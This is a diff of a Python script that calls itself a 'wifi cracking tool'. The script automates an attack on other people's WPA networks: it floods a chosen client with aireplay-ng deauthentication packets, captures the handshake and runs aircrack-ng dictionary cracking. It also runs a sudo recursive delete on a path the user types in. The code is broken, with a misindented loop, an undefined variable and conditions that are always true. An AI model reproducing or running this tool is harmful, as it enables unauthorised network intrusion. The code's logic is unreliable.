@@ -3,16 +3,18 @@
 #I'm in any case responsable of your usage
 #Developped by Nux 404
 
+
 import os 
 import time
 
 aireplay = 0
+HANDSHAKE = ""
 
 os.system("clear")
 
 print("I disclaim all responsibility for the use you make of my wifi cracking tool.")
 time.sleep(0.9)
-print("Please make sure that you are connect in super user mode (sudo -i).")
+print("Please make sure that you are connect in super user mode (sudo -i) before launch the cracking.")
 time.sleep(1)
 
 PATH = input("Enter the path to install files : ")
@@ -24,20 +26,21 @@ while PATH_Validity != True:
 	PATH_Validity = os.path.exists(f"{PATH_2}")
 	PATH = PATH_2
 
-if os.path.exists(f"AutomaticCRR"):
+os.system(f"cd {PATH}")
+
+if not os.path.exists("AutomaticCRR"):
+	os.makedirs(f"AutomaticCRR")
+
+if os.path.exists("AutomaticCRR"):
 	PATH = f"{PATH}AutomaticCRR/"
 	os.system(f"cd {PATH}")
 	if len(os.listdir(f"{PATH}")) != 0:
-		print(f"All your data saved on the file {PATH} will be deleted.")
-		rm = input("Do you want ton continue [y/n] (MANDATORY FOR PROGRAM USE) : ")
-		if rm == "y" or "Y":
-			os.system(f"sudo rm -R {PATH}")
-	else:
-		exit()
-
-os.makedirs(f"AutomaticCRR")
-
-PATH = (f"{PATH}AutomaticCRR/")
+		print(f"All your data saved on the file {PATH} will be deleted (MANDATORY FOR PROGRAM USE).")
+		rm = input("Do you want ton continue [Press enter to continue] : ")
+		if rm == "":
+			os.system(f"sudo rm -R {PATH}*")
+		else:
+			exit()
 
 os.system("clear")
 
@@ -63,9 +66,22 @@ time.sleep(12)
 STATION = input("Enter the STATION of the network to crack : ")
 os.system("clear")
 
-while aireplay != 50:
+while aireplay != 100:
 	aireplay = aireplay + 1
 	os.system(f"aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")
+
+while  HANDSHAKE =="n" or "N":
+	HANDSHAKE = input(f'Is the sentence "WPA HANSHAKE : {BSSID}" is displayed in the first page open ? [y/n] : ')
+	if retry_HANDSHAKE != "y" or "Y":
+		while aireplay != 100:
+		aireplay = 0
+		aireplay = aireplay + 1
+		os.system(f"aireplay-ng -0 1 -a {BSSID} -c {STATION} {INTERFACE_2}")
+	retry_HANDSHAKE = input("The sentence has appared ? [y/n]")
+	if retry_HANDSHAKE == "y" or "Y":
+		break
+	else:
+		continue
 
 time.sleep(1)
 os.system("clear")
@@ -81,12 +97,11 @@ while PATH_Validity != True:
 os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST} {PATH}-01.cap")
 
 retry = input("Do you want to try again with another list ? [y/n] : ")
-time.sleep(0.3)
-
+retry = str(retry)
 if retry == "y" or "Y":
 	PATH_LST_RETRY = input("Enter the list directory : ")
 	os.system(f"aircrack-ng -a2 -b {BSSID} -w {PATH_LST_RETRY} {PATH}-01.cap")
-	retry = input("Do you want to try again with another list ? [Y/N] : ")
 else:
 	exit()
 
+time.sleep(0.3)
